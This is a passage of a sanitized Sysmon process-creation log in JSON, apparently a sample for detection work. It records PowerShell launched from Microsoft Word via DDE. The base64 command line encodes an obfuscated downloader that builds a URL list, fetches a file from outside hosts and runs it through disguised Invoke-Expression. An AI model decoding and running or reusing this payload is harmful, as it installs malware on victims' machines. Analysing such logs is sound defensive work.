QA0ACAALAAgADkANwAgACwAIAAxADEAMAAgACwAMQAwADAALAAgADEAMQAxACAALAAxADAAOQAsADUAOQAgACwAMwA2ACwAMQAxADcALAAgADEAMQA0ACwAIAAxADAAOAAgACwAMQAxADUAIAAsADMAMgAgACwAIAA2ADEALAAzADIALAAzADkAIAAsADEAMAA0ACwAMQAxADYALAAxADEANgAsACAAMQAxADIAIAAsADUAOAAgACwAIAA0ADcAIAAsACAANAA3ACAALAA5ADkAIAAsADEAMQA2ACwAMQAwADkAIAAsACAAMQAwADcALAAxADAAMQAgACwAIAAxADEANgAgACwAIAA0ADYAIAAsADkAOQAsACAAMQAxADEAIAAsADEAMAA5ACAALAA0ADcAIAAsACAANwAwACwAMQAxADkALAAgADEAMAAwACwANgA2ACwAMQAwADQAIAAsACAAMQAxADEALAA0ADcALAAgADQANAAsADEAMAA0ACwAIAAxADEANgAgACwAIAAxADEANgAsADEAMQAyACwAIAA1ADgAIAAsADQANwAsADQANwAsACAAMQAxADMALAA0ADUAIAAsACAAMQAxADIAIAAsACAAMQAxADQALAAxADEAMQAsADEAMAAwACAALAAxADEANwAgACwAOQA5ACwAIAAxADEANgAgACwAMQAwADUALAAxADEAMQAsACAAMQAxADAALAAxADEANQAgACwANAA2ACwAOQA5ACwAIAAxADEAMQAgACwAIAAxADAAOQAsADQANwAgACwAIAAxADAANgAsADEAMAA3ACwAOAA4ACAALAAgADcAMgAsADgAMwAsADcANQAsACAAOAAzACAALAA3ADEALAAxADAANgAsACAANAA3ACAALAAgADQANAAsACAAMQAwADQAIAAsACAAMQAxADYAIAAsACAAMQAxADYAIAAsADEAMQAyACAALAA1ADgAIAAsADQANwAgACwAIAA0ADcAIAAsADEAMQA2ACwAMQAxADEAIAAsACAAMQAxADEALAAxADAAOAAsADEAMAAzACwAMQAwADEAIAAsACAAMQAwADEAIAAsACAAMQAwADcAIAAsADEAMAAxACwAIAAxADEANAAsADQANgAsADkAOQAgACwAMQAxADEALAAxADAAOQAgACwAIAA0ADcAIAAsADEAMgAxACwAIAA4ADEALAAgADQANwAsACAANAA0ACwAIAAxADAANAAgACwAMQAxADYALAAxADEANgAsADEAMQAyACwANQA4ACAALAA0ADcAIAAsADQANwAgACwAMQAxADEALAAgADEAMQAyACAALAA5ADcALAAxADEANAAgACwAIAA5ADcALAAgADQANgAgACwAIAA5ADkAIAAsACAAMQAxADEAIAAsACAANAA2ACAALAAxADIAMgAsADkANwAgACwANAA3ACAALAAxADAANAAgACwAMQAwADgALAA5ADAALAA4ADcALAAxADEAMgAsACAAMQAxADkAIAAsACAAOAA5ACAALAAgADcAMAAsACAAOAAyACAALAA0ADcAIAAsACAANAA0ACwAIAAxADAANAAsACAAMQAxADYAIAAsACAAMQAxADYAIAAsACAAMQAxADIALAA1ADgAIAAsACAANAA3ACwANAA3ACAALAAgADEAMAAzACwAMQAxADEALAAxADEAMQAgACwAMQAwADAAIAAsACAAMQAwADkAIAAsADkANwAsADEAMQAwACwAIAAxADEANQAsACAAOQA4ACwAOQA4ACwAIAAxADEAMwAgACwAIAA0ADYALAA5ADkALAAxADEAMQAsACAAMQAwADkALAA0ADcAIAAsADEAMQAzACAALAAgADEAMAA4ACAALAAgADEAMAA1ACAALAAgADEAMAA1ACwAIAA3ADUALAAgADgANQAsADgAMgAsACAAMQAwADUALAAgADQANwAsACAAMwA5ACwANAA2ACwAOAAzACAALAAxADEAMgAgACwAIAAxADAAOAAgACwAMQAwADUALAAxADEANgAsADQAMAAgACwAMwA5ACwANAA0ACAALAAgADMAOQAsADQAMQAsACAANQA5ACwAIAAzADYALAAgADEAMQAwACAALAA5ADcAIAAsACAAMQAwADkAIAAsACAAMQAwADEALAAgADMAMgAgACwAIAA2ADEAIAAsADMAMgAsACAAMwA2ACAALAAgADEAMQA0ACwAOQA3ACwAIAAxADEAMAAsADEAMAAwACAALAAgADEAMQAxACwAIAAxADAAOQAsADQANgAsADEAMQAwACAALAAxADAAMQAsACAAMQAyADAAIAAsACAAMQAxADYAIAAsACAANAAwACAALAA0ADkAIAAsACAANAA0ACAALAAgADMAMgAsACAANQA0ACwAIAA1ADMAIAAsADUAMwAsADUAMQAgACwAIAA1ADQAIAAsACAANAAxACwAIAA1ADkALAAgADMANgAgACwAIAAxADEAMgAgACwAIAA5ADcALAAgADEAMQA2ACwAMQAwADQALAAzADIAIAAsADYAMQAsACAAMwAyACwAMwA2ACAALAAgADEAMAAxACwAIAAxADEAMAAgACwAMQAxADgAIAAsADUAOAAsACAAMQAxADYAIAAsACAAMQAwADEAIAAsACAAMQAwADkALAAgADEAMQAyACAALAAzADIALAA0ADMAIAAsADMAMgAgACwAIAAzADkAIAAsADkAMgAsACAAMwA5ACAALAAgADMAMgAgACwAIAA0ADMAIAAsACAAMwAyACwAIAAzADYAIAAsACAAMQAxADAALAAgADkANwAsADEAMAA5ACwAIAAxADAAMQAgACwAIAAzADIAIAAsACAANAAzACAALAAzADIAIAAsACAAMwA5ACAALAAgADQANgAgACwAIAAxADAAMQAsADEAMgAwACAALAAgADEAMAAxACAALAAgADMAOQAgACwANQA5ACwAMQAwADIALAAgADEAMQAxACAALAAgADEAMQA0ACAALAAxADAAMQAsACAAOQA3ACAALAAgADkAOQAsADEAMAA0ACAALAA0ADAAIAAsADMANgAsACAAMQAxADcALAAgADEAMQA0ACwAIAAxADAAOAAsADMAMgAsACAAMQAwADUALAAgADEAMQAwACAALAAgADMAMgAsADMANgAgACwAIAAxADEANwAgACwAIAAxADEANAAgACwAMQAwADgAIAAsACAAMQAxADUAIAAsACAANAAxACAALAAgADEAMgAzACAALAAgADEAMQA2ACAALAAgADEAMQA0ACwAIAAxADIAMQAsADEAMgAzACAALAAgADMANgAgACwAMQAxADkALAAgADEAMAAxACwAOQA4ACwAIAA5ADkALAAxADAAOAAsADEAMAA1ACwAMQAwADEALAAgADEAMQAwACAALAAxADEANgAgACwANAA2ACAALAA2ADgALAAgADEAMQAxACAALAAgADEAMQA5ACAALAAxADEAMAAgACwAMQAwADgALAAxADEAMQAgACwAIAA5ADcALAAgADEAMAAwACwAIAA3ADAAIAAsACAAMQAwADUAIAAsADEAMAA4ACAALAAgADEAMAAxACwANAAwACAALAAgADMANgAgACwAIAAxADEANwAsADEAMQA0ACwAIAAxADAAOAAgACwAIAA0ADYAIAAsADgANAAgACwAMQAxADEALAA4ADMAIAAsACAAMQAxADYALAAxADEANAAgACwAIAAxADAANQAgACwAMQAxADAAIAAsACAAMQAwADMALAA0ADAALAA0ADEAIAAsACAANAA0ACAALAAzADIAIAAsACAAMwA2ACAALAAxADEAMgAsADkANwAsADEAMQA2ACAALAAxADAANAAgACwANAAxACAALAAgADUAOQAsACAAOAAzACwAMQAxADYAIAAsACAAOQA3ACwAMQAxADQAIAAsADEAMQA2ACwAIAA0ADUAIAAsACAAOAAwACAALAAgADEAMQA0ACwAMQAxADEAIAAsADkAOQAgACwAIAAxADAAMQAsACAAMQAxADUAIAAsADEAMQA1ACAALAAgADMAMgAsACAAMwA2ACAALAAxADEAMgAsADkANwAgACwAIAAxADEANgAsACAAMQAwADQAIAAsACAANQA5ACAALAAgADkAOAAsACAAMQAxADQAIAAsACAAMQAwADEAIAAsACAAOQA3ACAALAAxADAANwAsACAANQA5ACAALAAxADIANQAgACwAOQA5ACwAIAA5ADcAIAAsACAAMQAxADYAIAAsADkAOQAsACAAMQAwADQALAAxADIAMwAgACwAIAAxADEAOQAgACwAIAAxADEANAAsADEAMAA1ACAALAAgADEAMQA2ACAALAAxADAAMQAsACAANAA1ACwAIAAxADAANAAgACwAIAAxADEAMQAgACwAMQAxADUAIAAsACAAMQAxADYALAAzADIALAAzADYAIAAsACAAOQA1ACwANAA2ACwANgA5ACwAIAAxADIAMAAgACwAIAA5ADkAIAAsACAAMQAwADEAIAAsACAAMQAxADIAIAAsACAAMQAxADYAIAAsACAAMQAwADUALAAgADEAMQAxACAALAAgADEAMQAwACwANAA2ACwAIAA3ADcAIAAsADEAMAAxACwAIAAxADEANQAgACwAMQAxADUALAA5ADcAIAAsADEAMAAzACAALAAgADEAMAAxACAALAAgADUAOQAgACwAIAAxADIANQAgACwAIAAxADIANQApACAAKwAiACQAKAAgAFMARQBUAC0ASQB0AEUATQAgACAAJwBWAEEAcgBpAGEAQgBMAGUAOgBvAGYAcwAnACAAIAAnACAAJwAgACkAIAAiAHwAIAAmACgAKABnAFYAIAAnACoAbQBEAHIAKgAnACkALgBOAEEAbQBlAFsAMwAsADEAMQAsADIAXQAtAEoATwBpAG4AJwAnACkADQAKAA==",
      "CurrentDirectory": "C:\\Users\\Gen Eric\\Documents\\",
      "Hashes": "SHA1=04C5D2B4DA9A0F3FA8A45702D4256CEE42D8C48D,MD5=92F44E405DB16AC55D97E3BFE3B132FA,SHA256=6C05E11399B7E3C8ED31BAE72014CF249C144A8F4A2C54A758EB2E6FAD47AEC7,IMPHASH=96BA691B035D05F44E35AB23F6BA946C",
      "Image": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
      "IntegrityLevel": "Medium",
      "LogonGuid": "49F1AF32-4475-59DB-0000-0020B8040100",
      "LogonId": "0x000104b8",
      "ParentCommandLine": "\"C:\\Program Files (x86)\\Microsoft Office\\Office12\\WINWORD.EXE\" /n /dde",
      "ParentImage": "C:\\Program Files (x86)\\Microsoft Office\\Office12\\WINWORD.EXE",
      "ParentProcessGuid": "49F1AF32-4730-59DB-0000-0010A9950700",
      "ParentProcessId": "2168",
      "ProcessGuid": "49F1AF32-48E2-59DB-0000-00105B250D00",
      "ProcessId": "2336",
      "TerminalSessionId": "1",
      "User": "GenEric-PC\\Gen Eric",
      "UtcTime": "4242-04-24 13:37:42.422"
    },
    "System": {
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "BLAHBLAH",
      "Correlation": {},
      "EventID": "1",
      "EventRecordID": "32677",
      "Execution": {
        "ProcessID": "2160",
        "ThreadID": "2380"
      },
      "Keywords": "0x8000000000000000",
      "Level": "4",
      "Opcode": "0",
      "Provider": {
        "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
        "Name": "Microsoft-Windows-Sysmon"
      },
      "Security": {
        "UserID": "S-1-5-18"
      },
      "Task": "1",
      "TimeCreated": {
        "SystemTime": "4242-04-24 13:37:42.422"
      },
      "Version": "5"
    }
  }
}
